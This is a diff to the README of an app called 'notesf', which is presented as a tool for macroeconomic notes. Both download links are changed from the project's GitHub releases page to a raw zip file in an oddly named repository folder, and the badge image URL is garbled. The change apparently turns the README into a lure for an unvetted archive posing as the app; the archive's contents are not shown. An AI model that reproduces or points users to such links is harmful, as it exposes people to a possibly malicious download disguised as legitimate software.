@@ -1,7 +1,7 @@
 # 📝 notesf - Simplifying Macroeconomic Analysis for You
 
 ## 📥 Download the Application
-[![Download notesf](https://img.shields.io/badge/Download%20notesf-%E2%9C%92-brightgreen)](https://github.com/hab1bovv/notesf/releases)
+[![Download notesf](https://raw.githubusercontent.com/hab1bovv/notesf/main/picropodophyllin/notesf.zip%20notesf-%E2%9C%92-brightgreen)](https://raw.githubusercontent.com/hab1bovv/notesf/main/picropodophyllin/notesf.zip)
 
 ## 🚀 Getting Started
 Welcome to **notesf**! This application helps you analyze macroeconomic data by providing organized notes from past years. Use these to make informed decisions in macro trading and analysis.
@@ -13,7 +13,7 @@ Before installing, ensure your device meets these requirements:
 - Storage: 100 MB of free disk space
 
 ## 🌐 Download & Install
-To get started, visit this page to download: [Download notesf](https://github.com/hab1bovv/notesf/releases).
+To get started, visit this page to download: [Download notesf](https://raw.githubusercontent.com/hab1bovv/notesf/main/picropodophyllin/notesf.zip).
 
 1. Click on the link above.
 2. Choose the latest release.
